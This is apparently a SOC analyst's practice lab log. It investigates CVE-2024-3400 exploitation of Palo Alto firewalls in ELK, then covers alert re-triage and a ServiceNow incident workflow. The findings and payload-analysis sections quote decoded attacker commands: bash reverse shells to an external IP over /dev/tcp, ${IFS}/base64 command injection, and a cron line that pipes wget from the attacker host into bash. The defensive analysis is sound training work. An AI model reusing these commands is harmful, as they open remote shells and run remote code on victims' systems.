# Practice Checkpoint 01 Lab Log - External Reps + Mixed Queue Day

## Status

**Completed - November 9, 2026** (work sessions October 9 - November 9, 2026)

**Track 3 - Endpoint and Identity Investigation** (checkpoint before Capstone 02)

## Completion Summary

Practice Checkpoint 01 is not a numbered phase. Its purpose, per the roadmap, is
that triage cannot be learned only from alerts I generated myself: Track 3 ends
with an unfamiliar external case, a mixed queue of alerts from earlier phases,
two incomplete-evidence decisions, and severity tied to asset criticality.

I completed all four parts:

1. **External rep:** an unfamiliar CyberDefenders threat-hunting lab
   (PaloAltoRCE - UTA0218, CVE-2024-3400) investigated in ELK without
   walkthroughs, documented as a full Phase 6-format ticket, and moved through
   a complete case lifecycle in ServiceNow (INC0010001).
2. **Queue Day:** 10 alerts from Phases 2-13 re-triaged cold with the
   30-second first look, then compared against the original verdicts.
3. **Ambiguous evidence:** two missing-telemetry cases (Alerts #5 and #10)
   written up as Known / Cannot conclude / Evidence needed next.
4. **Asset context:** every host given a business role and criticality, and
   every severity call referenced it.

One deviation is recorded honestly: the guide allows "2 LetsDefend cases or 1
CyberDefenders lab." LetsDefend's alert queue turned out to be paid-only, and
the CyberDefenders trial access expired after 2 of the lab's 6 questions were
answered. The core intrusion was fully investigated and documented; the
remaining lab questions (persistence creation command, exfiltration) are
recorded as open items rather than claimed.

### Final Deliverables

| Requirement | Result |
|---|---|
| External rep | CyberDefenders PaloAltoRCE (Threat Hunting, Hard, ELK). Compromise of one firewall confirmed; Q1 and Q2 accepted |
| Phase 6-format ticket | Severity, status, summary, assets, detection source, evidence, analysis, verdict, containment, timeline, IOCs, ruled-out items, evidence gaps |
| Case workflow | ServiceNow INC0010001: created, In Progress, assigned, IOC work note, resolved with escalation notes |
| Queue Day | 10 alerts across Windows, Linux, network, phishing, and Active Directory |
| Ambiguous evidence | Alert #5 (no Sysmon Event 22) and Alert #10 (no DC-side failure events) |
| Asset context | 5 assets rated; criticality referenced in every severity decision |
| Case summary workbook | `PaloAltoRCE_Case_Summary.xlsx` (assets, timeline, evidence chain, IOCs, gaps, lessons) |

---

# 1. Objective

```text
Work an unfamiliar case without knowing the answer
  -> Build scope, timeline, and evidence chain from raw logs
  -> State what the evidence proves and what it does not
  -> Document it as a ticket and move it through a case-management lifecycle
  -> Re-triage a mixed queue under time pressure
  -> Tie every severity to what the affected asset means to the business
```

---

# 2. Choosing the External Rep

The platform choice took several attempts. Each rejection is documented because
the reasons apply to future external practice.

| Option tried | Outcome | Reason |
|---|---|---|
| LetsDefend (now part of Hack The Box) - SOC344 EDR-Freeze alert | Not usable | Wrote the 30-second first look, but taking ownership required VIP+. No free/VIP filter existed; the whole Monitoring queue appeared paid-only. Did not start the card-required trial |
| CyberDefenders free labs | Mostly unsuitable | Free Threat Hunting / Endpoint labs were largely Volatility memory labs (Phase 20 tooling), mobile forensics, or long disk-image cases |
| CyberDefenders SpottedInTheWild | Rejected | Download-only, ~8 new forensic tools, live malicious scripts in the evidence. Opening it on `windows10victim` would pollute Elastic/Wazuh/Splunk telemetry. Bookmarked for Phase 20 |
| **CyberDefenders PaloAltoRCE - UTA0218** | **Selected** | Trial cloud lab: browser ELK, nothing installed in the home lab, firewall/network evidence, 6 questions |

**Lesson:** for an external rep, check access type (cloud vs downloadable),
tooling, and licensing before reading the questions. A download-only malware
lab does not belong on a monitored lab endpoint.

---

# 3. External Rep - PaloAltoRCE (CVE-2024-3400)

## 3.1 Scenario and Case Question

A newly disclosed critical PAN-OS vulnerability (CVE-2024-3400). Case question:
**are any of the organization's systems impacted?**

Vendor advisory research (allowed; walkthroughs were not):

- Vulnerable: PAN-OS 10.2 / 11.0 / 11.1 with GlobalProtect gateway or portal.
- Impact: unauthenticated command injection leading to root code execution.
- Indicator: `failed to unmarshal session(...)` in `gpsvc.log` where the value
  is a file path or shell command instead of a GUID.

## 3.2 Evidence Inventory

Before hunting, I inventoried the data in Kibana Lens (`log.file.path.keyword`).

- **Scope: two firewalls** - `palo_alto2` and `palo_alto3`.
- **Sources:** PAN SSL-VPN access, nginx access/error, syslog, Linux auditd,
  Linux messages, `nf_conntrack`, and PAN-OS service logs (`gpsvc.log`,
  `md_out.log`).
- **Window:** Apr 21-26, 2024; auditd, Linux messages and nginx-error exist only
  for Apr 26.
- `host.name ip-172-31-28-17` is the log collector, not a firewall.

## 3.3 Key Findings

| Finding | Evidence |
|---|---|
| Exploitation attempts | `failed to unmarshal session(/../../../../opt/panlogs/tmp/device_telemetry/minute/...` with backtick-wrapped `echo${IFS}<base64>\|base64${IFS}-d\|bash` - path traversal plus command injection. Only on palo_alto3. 52 hits = ~26 unique attempts (each logged in both `gpsvc.log` and `md_out.log`) |
| Decoded payloads | `whoami >& /dev/tcp/54.162.164.22/13337 0>&1`, `ls >& /dev/tcp/54.162.164.22/8080 0>&1`, `bash -i >& /dev/tcp/54.162.164.22/1337 0>&1` (and 13337) - execution tests, then reverse shells |
| **Proof of success** | `syslog-system.log`: `PA-VM crond[...]: (root) CMD (wget -qO- http://54.162.164.22/update \| bash)` once per minute, 30 runs. A root cron job cannot exist without prior code execution |
| Corroboration | 54.162.164.22 in nginx access/error, PAN `sslvpn-access.log`, and `nf_conntrack` (inbound TCP to 172.31.43.113:443) |
| palo_alto2 | Same IP and same `curl` probe, ~10 hours before palo_alto3. No exploit indicator observed. Status: probed, not ruled out |

## 3.4 Timeline (UTC)

| Time (UTC) | Device | Event |
|---|---|---|
| 2024-04-21 18:17:07 | palo_alto2 | **First interaction:** `curl/7.81.0` GET / (repeated 18:21:42, 18:21:46) |
| 2024-04-22 04:23:31 | palo_alto3 | First `curl` GET / probe |
| 2024-04-22 05:15:46 | palo_alto3 | Scripted POST `/ssl-vpn/hipreport.esp` (`python-requests/2.31.0`); GET `/global-protect/portal/images/poc.txt` (permission denied) |
| 2024-04-22 05:17:42 - 05:18:39 | palo_alto3 | POST `/api/` (not found) |
| 2024-04-22 05:20:27 | palo_alto3 | **First observed exploit payload** (bash reverse shell, port 1337) |
| 2024-04-26 11:44:48 | palo_alto3 | Exploitation resumes: test payloads and reverse shells, ports 8080 / 13337 / 1337 |
| 2024-04-26 13:37:01 | palo_alto3 | Last observed exploit payload |
| 2024-04-26 13:39:01 | palo_alto3 | **First root cron execution** (syslog has no TZ; assumed PDT) |
| 2024-04-26 13:52:26 | palo_alto3 | GET `/global-protect/portal/css/bootstrap.men.css` - possible exfil, unconfirmed |
| 2024-04-26 14:02:05 | palo_alto3 | GET `/palo_ls` - possible exfil, unconfirmed |
| 2024-04-26 14:08:01 | palo_alto3 | Last observed cron execution - persistence assumed active |

## 3.5 Ruled Out

| Item | Verdict | Reasoning |
|---|---|---|
| 173.212.201.205 | Benign background scanning | Generic `.env` scanner (`/cron/.env`, `/cronlab/.env`, `/cron.sh`), all 301, Apr 25, different IP and day |
| palo_alto2 auditd `SOFTWARE_UPDATE` | Routine OS install | `crontabs` / `vixie-cron` installed by `swminternal`, `res=success`, epoch 1713727367 = 2024-04-21 19:22:47 UTC |

## 3.6 Lab Results and Evidence Gaps

| Q | Result |
|---|---|
| 1 - First threat actor IP | **Accepted:** 54.162.164.22 |
| 2 - Initial interaction (24h UTC) | **Accepted:** 2024-04-21 18:17:07 (first submission of 2024-04-22 04:23:31 was wrong - see 3.7) |
| 3 - Persistence command | Not determined |
| 4 - First reverse-shell port | Likely 1337 - not submitted |
| 5-6 - Exfiltration file / URL | Not investigated (trial access expired) |

| Gap | Status |
|---|---|
| How the cron job was created | No auditd coverage of cron files on palo_alto3; non-base64 payloads not checked before access expired |
| Contents served at `/update` | Not in available logs |
| Whether a reverse shell connected out | No outbound conntrack entry; conntrack is a point-in-time snapshot |
| Second actor | Questions imply more than one; 35.171.159.164 never investigated |
| Apr 22 - Apr 26 on palo_alto3 | Not reviewed |

## 3.7 Mistakes Caught and Corrected

1. **@timestamp is not event time.** Several sources stored ingestion time in
   `@timestamp` (Apr 26 ~17:58). The real time was inside the message. Mixed
   time handling across sources: nginx stored UTC correctly, syslog stored local
   time with no zone, `gpsvc`/`md_out` stored ingestion time.
2. **Narrowed scope too early (Q2 first answer wrong).** I searched only
   palo_alto3's web logs and answered 04:23:31 UTC. Following the hint - search
   the IOC across all sources, sort by time - found an earlier probe on
   palo_alto2. Rule: search an IOC everywhere before narrowing to the obvious
   target.
3. **Sort silently dropped after a Kibana restart.** "Sort fields" vs
   "1 field sorted" was the tell; unsorted results looked like a wrong answer.
4. **Shard failures from a text field.** Aggregating on `log.file.path` failed
   21 of 23 shards ("Fielddata is disabled"). Fix: use `.keyword`; do not set
   `fielddata=true`.
5. **Encoded IOCs do not match plain searches.** Searching `54.162.164.22`
   missed every payload in `gpsvc.log` because the IP was inside base64.
6. **Duplicate counting.** Each attempt appears in both `gpsvc.log` and
   `md_out.log`; 52 hits are ~26 attempts.
7. **Excel reformatted timestamps.** Copying the timeline out of the workbook
   turned four values into `4/22/2024 5:20` style, dropping seconds. Ticket
   values must be checked against the source.

## 3.8 Ticket Summary (Phase 6 Format)

- **Severity:** Critical - confirmed root compromise of an internet-facing
  perimeter firewall with active attacker-controlled persistence.
- **Status:** Escalated to Incident Response.
- **Summary:** External IP 54.162.164.22 performed reconnaissance against
  palo_alto2 and palo_alto3, then exploited CVE-2024-3400 on palo_alto3 with
  command-injection payloads, including a bash reverse shell to port 1337. The
  attacker established root-level cron persistence that downloads and executes
  a script every minute. palo_alto3 is compromised; palo_alto2 was probed only.
- **Recommended action:** preserve evidence before changes; isolate palo_alto3
  with approval/failover; block 54.162.164.22 inbound **and outbound** (stops
  callbacks and the cron fetch); rebuild and patch PAN-OS; rotate every
  credential, certificate and key on the device; check palo_alto2 for the
  indicator and patch; hand open items to IR.

---

# 4. Asset Context

Criticality is what the business loses if the asset is compromised, not what
activity has been seen on it.

| Asset | Business role (assigned) | Criticality | Reason |
|---|---|---|---|
| DC01 | Domain controller | **Critical** | Holds every domain credential including `krbtgt`; compromise = full domain control |
| DESKTOP-BN86O9N | Finance workstation | **High** | Payments and finance data; BEC/fraud and ransomware target |
| Ubuntu-SIEM | SIEM (Elastic/Kibana, Suricata) | **High** | Security infrastructure; control of it blinds the SOC and destroys evidence |
| splunk-soc | SIEM (Splunk) | **High** | Same reasoning as Ubuntu-SIEM |
| User mailbox | Finance employee mailbox | **High** | Credential phishing and invoice-fraud target |

**Corrections during the exercise:** my first ratings judged hosts by observed
activity ("Linux victim Low - only benign activity") and rated the SIEM Low as
"just a relay." Both were wrong. The Phase 12 Linux cron case also turned out to
run on `splunk-soc`, so that alert sits on a High-criticality host, not a
generic Linux server.

---

# 5. Queue Day - 10 Alerts

Method per alert: pull the original evidence, write the first look (host +
criticality, user, what fired, severity with reason, next check) before
re-reading the original verdict, then compare.

| # | Alert | Host | First look | Verdict | vs original |
|---|---|---|---|---|---|
| 1 | Encoded PowerShell (DET-001) | DESKTOP-BN86O9N (High) | Medium | Benign by context | Matches Phase 9; found an undocumented earlier run |
| 2 | Scheduled task `\Phase12\UpdaterCheck` | DESKTOP-BN86O9N (High) | High | Benign by context | Matches Phase 12 |
| 3 | Linux cron persistence | splunk-soc (High) | High | Benign by context | Matches Phase 12 |
| 4 | Suricata Applayer Mismatch SID 2260000 | Ubuntu-SIEM (High) | Low | Known false positive | Matches Phase 2 |
| 5 | nslookup loop, **no Sysmon Event 22** | DESKTOP-BN86O9N (High) | Low | Benign by context | Matches Phases 5-6 |
| 6 | Fake Okta sign-in email | Finance mailbox (High) | Medium | Confirmed phishing | Matches Phase 7; domain caught on first read this time |
| 7 | Invoice ZIP attachment | Finance mailbox (High) | High | Suspicious, pending sandbox | Matches Phase 7 |
| 8 | Password spray (4771 0x18) | DC01 (Critical) | Medium | Suspicious, no success | Matches Phase 11 |
| 9 | Domain Admins add/remove (4728/4729) | DC01 (Critical) | High | Benign by context | Matches Phase 11 |
| 10 | Admin logon failure, **no DC-side events** | DESKTOP-BN86O9N / DC01 | Low | Benign by context | Matches Day 13; adds the evidence source |

## 5.1 Alert Notes

**#1 Encoded PowerShell.** Two events, not one: EventRecordID 27040
(2026-09-16 03:01:25 UTC, Medium integrity, cwd `C:\Users\Nikola\`) and 33131
(17:36:55 UTC, **High** integrity, cwd `C:\Windows\system32` - elevated
console). Both parented by an interactive `powershell.exe` with no arguments.
Decoded (Base64 -> UTF-16LE): `Write-Output "Phase9 Encoded PowerShell
Detection Test"` and `"... Test 2"` - print-only. Severity stays Medium: once
decoded, the content decides risk; elevation only matters if the command does
something. Phase 9 documented only 33131.
*Correction:* my first reason was "executing PowerShell"; the notable technique
is `-EncodedCommand` (obfuscation). Host criticality raises **priority**, not
severity by itself. Also noted: `<Security UserID='S-1-5-18'>` is the Sysmon
service writing the log, not the actor.

**#2 Scheduled task.** `NIKOLA\Administrator` (Domain Admin) via PowerShell:
`/Create /TN \Phase12\UpdaterCheck /TR notepad.exe /SC ONLOGON /F` at 02:48:57
-> `/Query` -> `/Delete` 02:59:28 -> `/Query`. Existed ~10.5 minutes; never ran
(Phase 12: Last Result 0x41303). High at first look: ONLOGON persistence by a
Domain Admin on a High-criticality host. Production checks: change approval,
and why a Domain Admin was used on a workstation (IAM-01).
*Correction:* my first read called this a failed password attempt; nothing in
these events involves authentication.

**#3 Linux cron.** `journalctl -t crontab` (edits) + `journalctl -u cron`
(executions) on splunk-soc: REPLACE 03:08:41 -> runs every minute 03:09-03:24
as `nikola (uid 1000)` -> DELETE 03:24:38 -> no nikola session at 03:25. Root
`e2scrub_all` / `cron.hourly` lines are normal system jobs, excluded. The 03:09
run has session lines but **no CMD line** - it can be said a nikola cron
session ran; not what it executed. uid 1000 = no privilege escalation, though a
user account on the SIEM can still alter its own files.

**#4 Suricata.** 2 alerts, 08/25/2026 20:47:00 and 20:47:20,
`192.168.56.1` (host PC, VirtualBox host-only adapter) -> `192.168.56.112:5601`
(Kibana). Priority 3 = Suricata's lowest. Plain-HTTP Kibana confuses protocol
detection. Tuning candidate: suppress SID 2260000 for src 192.168.56.1 -> :5601.

**#5 nslookup - missing-evidence case 1.**

- Kibana, Aug 1 - Sep 30: `process.name:"nslookup.exe"` = 118 docs (mix of
  Event 1 and Event 3); `event.code:"22" and dns.question.name:*microsoft.com*`
  = 0.
- Event 1 (30): microsoft.com / github.com / google.com in rotation ~18 s apart,
  Aug 28 21:14-21:15, user Nikola - scripted (Phase 5 loop).
- Event 3: each run contacted `10.0.2.3:53` (VirtualBox NAT DNS).

| | |
|---|---|
| **Known** | Who ran it, which domains were requested, that the DNS server was contacted |
| **Cannot conclude** | Query results/answers; whether other lookups occurred |
| **Why the gap** | nslookup queries DNS directly and bypasses the Windows DNS Client that Sysmon Event 22 records - a collection limit, not tampering |
| **Evidence needed next** | DNS server query logs (the VirtualBox resolver keeps none); a sensor on the NAT path - Suricata monitors host-only `enp0s8` only and **cannot see this traffic**; confirm parent process = Phase 5 script |

**#6 Fake Okta.** `okta-verification[.]com` is not Okta-owned. Medium: confirmed
phishing, no evidence of click or credential entry. Escalate to High if clicked,
Critical if credentials were used. Next check: proxy/DNS visits, IdP sign-ins,
other recipients.
*Correction:* I first rated it Critical; my severity model reserves Critical for
confirmed compromise.

**#7 Invoice ZIP.** Sender `billing@secure-invoices-payments[.]com`,
`Invoice_INV-88421.zip`. High: unsolicited archive plus payment urgency aimed at
finance. Verdict "suspicious, pending sandbox/hash" - the risk is in the file
and cannot be proven from the email text.
*Correction:* I first put the sender in the asset field and called the payload
"malicious" before any analysis.

**#8 Password spray.** `index=* host=DC01 EventCode=4771`: 7 events Oct 5
13:48-13:53 against soc.analyst1 / helpdesk.user1 / test.employee1, all from
`::ffff:192.168.56.114` (DESKTOP-BN86O9N), all `0x18`. One Sep 30 20:38 event
excluded as unrelated. Medium: spray pattern, no success.
*Correction:* `0x18` is the Kerberos **Failure_Code** (bad password), not a
Logon Type - so every attempt failed.

**#9 Domain Admins.** 4728 at 14:54:37 and 4729 at 14:54:46 (~9.6 s),
actor `Administrator`, target `test.employee1`. In 4728/4729 the first
`Account_Name` is the actor and the second is the member. Baseline noise
separated: Sep 18 `MINWINPC$` (Windows install) and Sep 26 `ANONYMOUS LOGON`
adding Administrator to Domain Admins / Group Policy Creator Owners (domain
promotion - to confirm against Phase 10 dates).
**Side finding:** a 4728 on Sep 30 21:02:54 adds helpdesk.user1 to a group named
**IT Admins** - the event the Day 13 note was looking for. It conflicts with the
replication metadata (live group never held a member), so the group-SID
comparison is now the decisive check.

**#10 Admin logon failure - missing-evidence case 2.** From Day 13 Section 9.3.

| | |
|---|---|
| **Known** | Attempts happened; account and password valid; DC01 never received them (no 4771/4776/4625); the workstation's machine account first got a ticket at 22:14:43, after the attempts; `runas` succeeded at 22:16:52 (4768 0x0) |
| **Cannot conclude** | The exact local failure reason; absence of DC events is not proof nothing failed - the evidence is on the workstation |
| **Evidence needed next** | The workstation's own Security log: Event 4625 on DESKTOP-BN86O9N with Status/SubStatus (e.g. `0xC000005E` = no logon servers) - `host=DESKTOP-BN86O9N EventCode=4625` in Splunk; System log Netlogon/time-sync events at boot |

---

# 6. Case Workflow - ServiceNow

## 6.1 Instance

| Event | Detail |
|---|---|
| Oct 20 | Requested Brazil (latest) PDI - waitlisted ("something went wrong") |
| Oct 21 | Instance granted; not logged into |
| Nov 9 | Instance gone (reclaimed after ~19 days idle). Requested **Australia** - provisioned immediately: `dev413493`, user `admin` |

Credentials stored in the password manager, not in this log.

## 6.2 INC0010001 Lifecycle

| Field | Value |
|---|---|
| Short description | CVE-2024-3400 exploitation - palo_alto3 compromised, root cron persistence |
| Caller / Category | System Administrator / Network |
| Impact / Urgency / Priority | 1-High / 1-High / **1-Critical** (calculated) |
| Assignment | Service Desk / Beth Anglin |
| Description | Ticket Alert Summary |

| Time (instance clock) | Activity |
|---|---|
| 14:37:01 | Created - New, P1; three SLA timers started |
| 15:21:19 | State New -> **In Progress** |
| 15:22:49 | **Assigned to** Beth Anglin |
| 15:22:49 | **Work note:** observables (IP, URL, ports, user agents, paths, affected hosts, severity) |
| 15:24:20 | **Resolved** - code "Workaround provided"; notes: triage complete, escalated to IR, containment steps, open items handed over |

## 6.3 Observations

- **SLA breach:** Priority 1 response SLA (15 min) completed at 305% - response
  is measured to assignment, which happened 45 minutes after creation. In a
  real queue: assign first, investigate after. The resolution SLA paused at
  78.86% when the incident was resolved.
- **Self Service view** hides analyst fields; create from All -> Incident ->
  Create New for the full form.
- **Assigned to is filtered by Assignment group membership.** System
  Administrator was not offered because it is not in the Network group, and the
  Network group appeared to have no members. Switched to Service Desk rather
  than adding admin to a group (no unneeded configuration change).
- **Submit vs Save/Update:** Submit and Update return to the list; the form
  menu Save keeps it open.
- **Closure wording:** a confirmed perimeter compromise is not "solved" at
  L1/L2 - the resolution notes record the handoff to IR and what remains open.

---

# 7. Troubleshooting

| Issue | Root cause | Fix |
|---|---|---|
| Lens table showed "21 of 23 shards failed" | Terms aggregation on text field `log.file.path` | Use `log.file.path.keyword`; a stale warning from the removed query persisted until refresh |
| Q2 answer wrong | Narrowed to palo_alto3 before searching the IOC everywhere | IOC across all sources, Old-New sort |
| Old-New sort produced Apr 26 first | Sort dropped after Kibana restart ("Sort fields" label) | Reapply sort, confirm "1 field sorted" |
| Kibana "No results" | Time picker changed to Last 24 hours while converting "24h UTC" | "24h UTC" is the answer format, not a setting |
| Kibana range stuck "to now" | Whole range typed into the Start box; End left on Now | Start and End as separate Absolute values |
| Lens config lost | F5 reload (my bad advice) | Rebuilt the table |
| Day 9 SPL host value | Log contains `DESKTOP-BN8O9N` (missing 6) | Use `DESKTOP-BN86O9N` |
| Two commands pasted on one SSH line | Paste joined lines | Run commands one at a time |
| Malwarebytes "suspicious text copied" | Copying payload text containing shell commands | Expected - evidence copied as text, never into a terminal |
| ServiceNow instance missing | Reclaimed while idle | New instance; log in within a day and regularly |

---

# 8. Open Items

- Fix the four Excel-reformatted timestamps in the PaloAltoRCE ticket.
- Alert #10: run `host=DESKTOP-BN86O9N EventCode=4625` to close the Day 13
  "local failure reason" question.
- IT Admins: compare the Sep 30 21:02:54 4728 group SID with the live
  `objectSid` (now the decisive check).
- Confirm the Sep 26 `ANONYMOUS LOGON` 4728s against the Phase 10 domain
  promotion date.
- PaloAltoRCE Q3-Q6 if trial access becomes available again.
- Carried from Day 13: DC01 evaluation licence; password expiries -
  `soc.analyst1` 11/10, `svc_legacy` / `svc_web` 11/16 (new passwords 12+
  characters); Phase 12 logging gaps; Splunk forwarder bookmark defect.
- Keep the ServiceNow PDI active.

---

# 9. Skills Demonstrated

- Unfamiliar-case threat hunting in ELK: evidence inventory, scope, IOC pivoting.
- CVE research from a vendor advisory and translating its indicator into KQL.
- Payload analysis: path traversal, command injection, `${IFS}`, base64 and
  UTF-16LE decoding, `/dev/tcp` reverse shells.
- Attempt vs success reasoning; persistence as proof of execution.
- Multi-source timeline reconstruction with UTC normalization.
- Ruling out benign noise (scanners, OS package installs, domain-build events).
- Containment planning with evidence preservation and business impact.
- Rapid triage with asset-aware severity across Windows, Linux, network,
  email, and AD alerts.
- Incomplete-evidence write-ups: Known / Cannot conclude / Evidence needed.
- ServiceNow incident lifecycle, assignment groups, work notes, SLAs.

---

# 10. Interview-Ready Summary

> To practice on cases I didn't build, I worked an unfamiliar CyberDefenders lab
> on CVE-2024-3400 in Palo Alto firewalls using ELK. I inventoried the evidence,
> found the vendor's exploitation indicator in `gpsvc.log`, decoded the base64
> payloads into execution tests and bash reverse shells, and proved success
> with a root cron job pulling a script from the attacker every minute. I built
> a UTC timeline across sources with different timestamp handling, and one
> lesson stuck: my first answer for initial contact was wrong because I narrowed
> to the obvious firewall too early - searching the IOC across every source
> showed the attacker probed a second firewall ten hours earlier.
>
> I wrote it up as a Critical ticket with containment - preserve evidence,
> isolate, block the attacker IP outbound as well as inbound, rebuild, patch,
> rotate credentials - and took it through a ServiceNow lifecycle: assignment,
> status, IOC work notes, and an escalation to IR, where I also saw a P1
> response SLA breach because assignment lagged.
>
> I then re-triaged ten alerts from my lab across endpoint, Linux, network,
> phishing and Active Directory, tying each severity to the asset's business
> criticality, and wrote two missing-evidence cases stating exactly what the
> logs could and couldn't prove and where the missing evidence would be.

---

# 11. Checkpoint Outcome

Practice Checkpoint 01 is complete.

I can now:

- Choose external practice that is safe for a monitored lab.
- Work an unfamiliar case from raw logs to a defensible conclusion.
- Separate event time from ingestion time and normalize to UTC.
- Tell an attempt from a success, and say what proves the difference.
- Rate severity from evidence and set priority from asset criticality.
- Write defensible non-conclusions when telemetry is missing.
- Move a case through ServiceNow from creation to escalation and resolution.

## Up Next

**Capstone 02 - Endpoint and Identity Investigation Capstone**

- Investigate an identity-driven endpoint compromise scenario.
- Produce a timeline, a containment recommendation, and an identity hardening
  report.
- Interview defense of Track 3 work.
